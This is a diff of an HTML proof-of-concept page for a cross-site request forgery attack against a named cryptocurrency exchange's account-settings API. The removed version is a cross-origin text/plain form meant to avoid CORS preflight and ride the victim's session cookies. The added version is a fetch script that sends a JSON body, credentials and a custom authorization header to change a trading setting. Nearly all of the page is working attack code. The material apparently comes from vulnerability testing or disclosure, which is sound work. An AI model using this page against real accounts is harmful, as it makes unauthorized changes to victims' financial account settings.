@@ -2,40 +2,74 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>CSRF PoC — manual submit</title>
+  <title>CSRF PoC — JSON Content-Type (manual)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; padding: 24px; }
-    .card { border: 1px solid #ddd; padding: 18px; border-radius: 8px; max-width: 720px; }
-    .hint { font-size: 13px; color: #555; margin-top: 12px; }
-    button { padding: 10px 16px; font-size: 15px; border-radius: 6px; cursor: pointer; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 20px; background:#f7f7f8; }
+    .card { background: #fff; border: 1px solid #e1e4e8; border-radius: 10px; padding: 18px; max-width:720px; }
+    label { display:block; margin:8px 0 4px; font-weight:600; }
+    textarea, input[type=text] { width:100%; box-sizing:border-box; padding:8px; border-radius:6px; border:1px solid #d0d7de; }
+    button { margin-top:12px; padding:10px 14px; font-size:15px; border-radius:8px; cursor:pointer; }
+    pre { background:#111; color:#fff; padding:12px; border-radius:8px; overflow:auto; margin-top:12px; }
+    .hint { font-size:13px; color:#555; margin-top:10px; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>CSRF PoC — manual submit</h2>
+    <h2>CSRF PoC — JSON Content-Type</h2>
+
     <p>
-      Click the button below while the victim is logged in to <code>https://bitso.com</code>
-      to POST the payload to <code>/api/v3/settings/account</code>.
+      This sends a POST to <code>https://bitso.com/api/v3/settings/account</code> with
+      <code>Content-Type: application/json</code>. It also includes the <code>Authorization: Bitso-CSRF-TOKEN </code>
+      header. Click <strong>Submit</strong> while you're on the bitso.com origin (or run as bookmarklet / in console) to execute.
     </p>
 
-    <form id="csrf-form"
-          method="POST"
-          action="https://bitso.com/api/v3/settings/account"
-          enctype="text/plain">
-      <!-- payload placed as plain text so browser sends Content-Type: text/plain -->
-      <textarea name="data" style="width:100%;height:80px;display:block;margin-bottom:12px;">
-{"slippage_protection_enabled":true}
-      </textarea>
+    <label for="auth">Authorization header value</label>
+    <input id="auth" type="text" value="Bitso-CSRF-TOKEN " />
 
-      <!-- visible manual submit button -->
-      <button type="submit">Submit request</button>
-    </form>
+    <label for="payload">JSON payload</label>
+    <textarea id="payload" rows="5">{"slippage_protection_enabled":true}</textarea>
+
+    <button id="send">Submit request</button>
 
     <p class="hint">
-      Note: This form intentionally uses <code>enctype="text/plain"</code> so the browser will send a
-      simple POST (no CORS preflight). It relies on cookie-based session authentication (cookies will be sent automatically).
-      If the server requires <code>Content-Type: application/json</code>, a custom header, or a CSRF token, this will likely fail.
+      Note: For this to work the page must run on the <strong>same origin</strong> as the API (https://bitso.com).
+      If you open this page from another origin, the browser will block custom headers / JSON unless the server allows it via CORS.
     </p>
+
+    <pre id="result">Result will appear here after submit.</pre>
   </div>
+
+  <script>
+    (function(){
+      const sendBtn = document.getElementById('send');
+      const result = document.getElementById('result');
+      sendBtn.addEventListener('click', async function(e){
+        e.preventDefault();
+        result.textContent = 'Sending...';
+
+        const auth = document.getElementById('auth').value;
+        let bodyText = document.getElementById('payload').value.trim();
+        try {
+          // Ensure JSON parse for nicer error messages
+          const parsed = JSON.parse(bodyText);
+          const resp = await fetch('https://bitso.com/api/v3/settings/account', {
+            method: 'POST',
+            credentials: 'include',   // send cookies
+            headers: {
+              'Content-Type': 'application/json',
+              'Authorization': auth
+            },
+            body: JSON.stringify(parsed)
+          });
+
+          const text = await resp.text();
+          result.textContent = 'HTTP ' + resp.status + ' ' + resp.statusText + '\n\n' + text;
+        } catch (err) {
+          result.textContent = 'Error: ' + err.message;
+        }
+      });
+    })();
+  </script>
 </body>
 </html>
